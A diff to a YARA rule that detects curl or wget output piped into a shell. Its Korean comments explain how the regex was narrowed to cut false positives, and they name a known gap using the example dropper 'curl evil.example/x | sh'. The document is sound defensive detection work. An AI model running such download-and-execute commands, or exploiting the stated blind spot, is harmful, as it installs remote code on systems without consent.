@@ -98,12 +98,22 @@ rule SOC_Curl_Pipe_Shell_Dropper
         author = "SOC Dashboard"
         severity = "HIGH"
         mitre = "T1105"
-        // 처음에는 "curl " 과 "| sh" 를 각각 찾아 AND 로 묶었는데, /usr/bin 743개를
-        // 실제로 스캔해 보니 ctest·tailscale 이 걸렸다 — 바이너리 안에 두 문자열이
-        // 서로 멀리 떨어져 존재했을 뿐이다. 실제 드로퍼는 **한 명령줄 안에서**
-        // 파이프가 이어진다. 근접성을 조건에 넣어 그 차이를 표현한다.
+        // 오탐을 두 번 줄였다. 둘 다 실측에서 나왔다.
+        //
+        // 1) 처음에는 "curl " 과 "| sh" 를 각각 찾아 AND 로 묶었다. /usr/bin 743개를
+        //    스캔하니 ctest·tailscale 이 걸렸다 — 바이너리 안에 두 문자열이 서로
+        //    멀리 떨어져 있었을 뿐이다. 실제 드로퍼는 **한 명령줄 안에서** 파이프가
+        //    이어지므로 근접성을 조건에 넣었다.
+        // 2) 그래도 CI 러너의 GNU parallel 이 걸렸다. 자기 설치 안내문에
+        //    "wget -O - pi.dk/3 | bash" 가 들어 있다 — 문서에 적힌 명령과 실행되는
+        //    명령을 YARA 가 구분할 수는 없다. 대신 **스킴이 있는 전체 URL**을
+        //    요구했다. 실제 드로퍼는 http(s):// 를 쓰고, 문서의 축약형은 빠진다.
+        //
+        // 알려진 한계: `curl evil.example/x | sh` 처럼 스킴 없이 쓰는 드로퍼는
+        // 놓친다. 자동 스캔이 시스템 전체를 훑는 이상 오탐을 줄이는 쪽을 택했다
+        // — 늑대소년이 되면 사람이 알림을 안 본다.
     strings:
-        $dropper = /(curl|wget)[^\n\r]{0,200}\|\s{0,4}(sudo\s+|env\s+)?(ba|z|k|da)?sh\b/
+        $dropper = /(curl|wget)[^\n\r]{0,200}https?:\/\/[^\n\r]{0,200}\|\s{0,4}(sudo\s+|env\s+)?(ba|z|k|da)?sh\b/
     condition:
         $dropper
 }
